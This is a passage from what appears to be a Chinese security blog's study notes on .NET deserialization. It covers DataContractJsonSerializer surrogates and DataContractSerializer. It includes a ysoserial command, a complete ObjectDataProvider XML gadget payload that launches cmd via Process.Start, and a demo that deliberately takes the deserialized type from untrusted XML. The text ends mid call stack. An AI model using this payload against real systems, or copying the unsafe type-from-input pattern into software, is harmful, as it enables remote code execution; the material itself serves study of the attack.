class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.CodeDom;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Json;</span><br><span class="line"><span class="keyword">using</span> System.Xml.Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractJsonDeserializer</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">public</span> Dog dog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Dog</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">DataContract</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">DogSurrogated</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> xmlData;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">DogSurrogate</span> : <span class="title">IDataContractSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetCustomDataToExport</span>(<span class="params">MemberInfo memberInfo, Type dataContractType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetCustomDataToExport invoked&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetCustomDataToExport</span>(<span class="params">Type clrType, Type dataContractType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetCustomDataToExport invoked&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Type <span class="title">GetDataContractType</span>(<span class="params">Type type</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetDataContractType invoked, <span class="subst">&#123;type&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (type.IsAssignableFrom(<span class="keyword">typeof</span>(Dog)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">typeof</span>(DogSurrogated);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> type;  </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetDeserializedObject</span>(<span class="params"><span class="built_in">object</span> obj, Type targetType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetDeserializedObject invoked <span class="subst">&#123;obj&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">is</span> DogSurrogated)</span><br><span class="line">            &#123;</span><br><span class="line">                DogSurrogated ps = (DogSurrogated)obj;</span><br><span class="line">                XmlSerializer xs = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Dog));</span><br><span class="line">                <span class="keyword">return</span> (Dog)xs.Deserialize(<span class="keyword">new</span> StringReader(ps.xmlData));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetKnownCustomDataTypes</span>(<span class="params">Collection&lt;Type&gt; customDataTypes</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetKnownCustomDataTypes invoked. <span class="subst">&#123;customDataTypes&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">GetObjectToSerialize</span>(<span class="params"><span class="built_in">object</span> obj, Type targetType</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;GetObjectToSerialize invoked,<span class="subst">&#123;obj&#125;</span>,<span class="subst">&#123;targetType.FullName&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (obj <span class="keyword">is</span> Dog)</span><br><span class="line">            &#123;</span><br><span class="line">                DogSurrogated ps = <span class="keyword">new</span> DogSurrogated();</span><br><span class="line">                XmlSerializer xs = <span class="keyword">new</span> XmlSerializer(<span class="keyword">typeof</span>(Dog));</span><br><span class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">                xs.Serialize(sw, (Dog)obj);</span><br><span class="line">                ps.xmlData = sw.ToString();</span><br><span class="line">                <span class="keyword">return</span> ps;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Type <span class="title">GetReferencedTypeOnImport</span>(<span class="params"><span class="built_in">string</span> typeName, <span class="built_in">string</span> typeNamespace, <span class="built_in">object</span> customData</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetReferencedTypeOnImport invoked&quot;</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;\t Type Name: &#123;0&#125;&quot;</span>, typeName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (typeName.Equals(<span class="string">&quot;DogSurrogated&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Returning Dog&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">typeof</span>(Dog);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> CodeTypeDeclaration <span class="title">ProcessImportedType</span>(<span class="params">CodeTypeDeclaration typeDeclaration, CodeCompileUnit compileUnit</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;ProcessImportedType invoked&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> typeDeclaration;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] vs</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person();</span><br><span class="line">            person.Name = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line">            Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">            dog.Name = <span class="string">&quot;jjjj&quot;</span>;</span><br><span class="line">            person.dog = dog;</span><br><span class="line">            List&lt;Type&gt; knownTypes = <span class="keyword">new</span> List&lt;Type&gt;();</span><br><span class="line">            DogSurrogate surrogate = <span class="keyword">new</span> DogSurrogate();</span><br><span class="line">            <span class="comment">//DataContractSerializer surrogateSerializer = new DataContractSerializer(typeof(Person), knownTypes, Int16.MaxValue, false, true, surrogate);</span></span><br><span class="line">            DataContractJsonSerializer dataContractJsonSerializer = <span class="keyword">new</span> DataContractJsonSerializer(<span class="keyword">typeof</span>(Person), knownTypes, <span class="built_in">int</span>.MaxValue, <span class="literal">false</span>, surrogate, <span class="literal">false</span>);</span><br><span class="line">            FileStream fs = <span class="keyword">new</span> FileStream(<span class="string">&quot;1.txt&quot;</span>, FileMode.OpenOrCreate);</span><br><span class="line">            dataContractJsonSerializer.WriteObject(fs, person);</span><br><span class="line">            fs.Close();</span><br><span class="line">            Console.WriteLine(File.ReadAllText(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"></span><br><span class="line">            Person p1 = (Person)dataContractJsonSerializer.ReadObject(File.Open(<span class="string">&quot;1.txt&quot;</span>, FileMode.Open));</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;person.Name:<span class="subst">&#123;p1.Name&#125;</span>\t person.dog.Name:<span class="subst">&#123;p1.dog.Name&#125;</span>&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240313111309274.png" alt="image-20240313111309274"></p><p>这里的话一共是有三个类</p><p>其中Person标记了DataContract，但是其dog字段的类型Dog没有标记DataContract，所以新建了一个DogSurrogated类来表示Dog类型。</p><p>在代码中新建了DogSurrogate类实现IDataContractSurrogate接口方法，并将其传入DataContractJsonSerializer构造函数。</p><p>DogSurrogate在这个类中  实现了序列化和反序列化操作</p><p><img src="../images/image-20240313111639103.png" alt="image-20240313111639103"></p><p><img src="../images/image-20240313111645855.png" alt="image-20240313111645855"></p><p>这里这个接口也是一样  我们可以自己定义需要反序列化的类  在实战中 我们只需要重写这个接口  在里面写上对应的类就行了</p><p><strong>其实对这个IDataContractSurrogate  接口来讲  我认为实战中是有点难进行利用的  应该遇到会很少</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractJsonSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deseriali</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-08</title>
    <link href="https://ke1nys.github.io/posts/dd27a293.html"/>
    <id>https://ke1nys.github.io/posts/dd27a293.html</id>
    <published>2024-03-11T08:07:32.000Z</published>
    <updated>2024-03-12T14:41:01.020Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md</a></p><h2 id="DataContractSerializer"><a href="#DataContractSerializer" class="headerlink" title="DataContractSerializer"></a>DataContractSerializer</h2><p>其实这个类和<code>xmlSerializer</code>是类似的  都是得控制type变量的值  还有传入的xml的值</p><p>(type的值必须得是序列化的类  不然会反序列化失败)</p><p>其不同的是这个类的序列化和反序列化的是依靠writeobject和readobject类</p><p>给个官方的Demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// You must apply a DataContractAttribute or SerializableAttribute</span></span><br><span class="line">    <span class="comment">// to a class to have it serialized by the DataContractSerializer.</span></span><br><span class="line">    [<span class="meta">DataContract(Name = <span class="string">&quot;Customer&quot;</span>, Namespace = <span class="string">&quot;http://www.contoso.com&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> FirstName;</span><br><span class="line">        [<span class="meta">DataMember</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> LastName;</span><br><span class="line">        [<span class="meta">DataMember()</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Person</span>(<span class="params"><span class="built_in">string</span> newfName, <span class="built_in">string</span> newLName, <span class="built_in">int</span> age</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            FirstName = newfName;</span><br><span class="line">            LastName = newLName;</span><br><span class="line">            Age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                WriteObject(<span class="string">&quot;DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">                ReadObject(<span class="string">&quot;DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">catch</span> (SerializationException serExc)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Serialization Failed&quot;</span>);</span><br><span class="line">                Console.WriteLine(serExc.Message);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception exc)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;The serialization operation failed: &#123;0&#125; StackTrace: &#123;1&#125;&quot;</span>,</span><br><span class="line">                exc.Message, exc.StackTrace);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Press &lt;Enter&gt; to exit....&quot;</span>);</span><br><span class="line">                Console.ReadLine();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WriteObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Creating a Person object and serializing it.&quot;</span>);</span><br><span class="line">            Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;bill&quot;</span>, <span class="string">&quot;gates&quot;</span>, <span class="number">100</span>);</span><br><span class="line">            FileStream writer = <span class="keyword">new</span> FileStream(fileName, FileMode.Create);</span><br><span class="line">            DataContractSerializer ser = <span class="keyword">new</span> DataContractSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line">            ser.WriteObject(writer, p1);</span><br><span class="line">            writer.Close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;Deserializing an instance of the object.&quot;</span>);</span><br><span class="line">            FileStream fs = <span class="keyword">new</span> FileStream(fileName, FileMode.Open);</span><br><span class="line">            XmlDictionaryReader reader = XmlDictionaryReader.CreateTextReader(fs, <span class="keyword">new</span> XmlDictionaryReaderQuotas());</span><br><span class="line">            DataContractSerializer ser = <span class="keyword">new</span> DataContractSerializer(<span class="keyword">typeof</span>(Person));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Deserialize the data and read it from the instance.</span></span><br><span class="line">            Person deserializedPerson = (Person)ser.ReadObject(reader, <span class="literal">true</span>);</span><br><span class="line">            reader.Close();</span><br><span class="line">            fs.Close();</span><br><span class="line">            Console.WriteLine(String.Format(<span class="string">&quot;&#123;0&#125; &#123;1&#125;, Age: &#123;2&#125;&quot;</span>, deserializedPerson.FirstName, deserializedPerson.LastName, deserializedPerson.Age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码关键点在于<code>new DataContractSerializer(typeof(Person))</code>指定序列化对象类型Type，然后调用ReadObject()和WriteObject()进行序列化反序列化。</p><p>同样  如果我们要传入<code>ObjectDataProvider</code>生成的那个xml的poc的话  我们的type也必须是<code>ObjectDataProvider</code>(其实是ExpandedWrapper  这里说ObjectDataProvider是为了好理解一点  )</p><p>至于为啥是ExpandedWrapper的话建议去看02那一篇文章</p><h2 id="ObjectDataProvider-攻击链"><a href="#ObjectDataProvider-攻击链" class="headerlink" title="ObjectDataProvider (攻击链)"></a>ObjectDataProvider (攻击链)</h2><p>yso生成的poc</p><p><code>ysoserial.exe -f DataContractSerializer -g ObjectDataProvider -c &quot;calc&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">type</span>=<span class="string">&quot;System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System.Data.Services.Internal&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:c</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:i</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">                                                         <span class="attr">xmlns:z</span>=<span class="string">&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;</span></span></span><br><span class="line"><span class="tag">                                                         &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExpandedElement</span> <span class="attr">z:Id</span>=<span class="string">&quot;ref1&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">__identity</span> <span class="attr">i:nil</span>=<span class="string">&quot;true&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ExpandedElement</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ProjectedProperty0</span> <span class="attr">xmlns:a</span>=<span class="string">&quot;http://schemas.datacontract.org/2004/07/System.Windows.Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:MethodName</span>&gt;</span>Start<span class="tag">&lt;/<span class="name">a:MethodName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:MethodParameters</span> <span class="attr">xmlns:b</span>=<span class="string">&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">b:anyType</span> <span class="attr">i:type</span>=<span class="string">&quot;c:string&quot;</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">b:anyType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">b:anyType</span> <span class="attr">i:type</span>=<span class="string">&quot;c:string&quot;</span>&gt;</span>/c calc<span class="tag">&lt;/<span class="name">b:anyType</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a:MethodParameters</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a:ObjectInstance</span> <span class="attr">z:Ref</span>=<span class="string">&quot;ref1&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ProjectedProperty0</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            ReadObject(<span class="string">&quot;D:\\Rider\\Project\\ConsoleApplication2\\ConsoleApplication2\\DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xml = File.ReadAllText(fileName);</span><br><span class="line">            XmlDocument xmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            xmlDocument.LoadXml(xml);</span><br><span class="line">            XmlNode rootNode = xmlDocument.SelectSingleNode(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            <span class="comment">//Console.WriteLine(rootNode.InnerXml);</span></span><br><span class="line">            XmlNode typeNode = rootNode.Attributes.GetNamedItem(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">            Console.WriteLine(Type.GetType(typeNode.InnerText));</span><br><span class="line">            DataContractSerializer dataContractSerializer = <span class="keyword">new</span> DataContractSerializer(Type.GetType(typeNode.InnerText));</span><br><span class="line">            dataContractSerializer.ReadObject(<span class="keyword">new</span> XmlTextReader(<span class="keyword">new</span> StringReader(rootNode.InnerXml)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话type直接就是从xml中获取的</p><p><img src="../images/image-20240312111312986.png" alt="image-20240312111312986"></p><p>调用栈</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Process.Start()</span><br><span class="line">[<span class="meta">Native to Managed Transition</span>]</span><br><span class="line">RuntimeMethodInfo.UnsafeInvokeInternal()</span><br><span class="line">RuntimeMethodInfo.Invoke()</span><br><span class="line">RuntimeType.InvokeMember()</span><br><span class="line">ObjectDataProvider.InvokeMethodOnInstance()</span><br><span class="line">ObjectDataProvider.QueryWorker()</span><br><span class="line">ObjectDataProvider.BeginQuery()</span><br><span class="line">ObjectDataProvider.set_ObjectInstance()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span 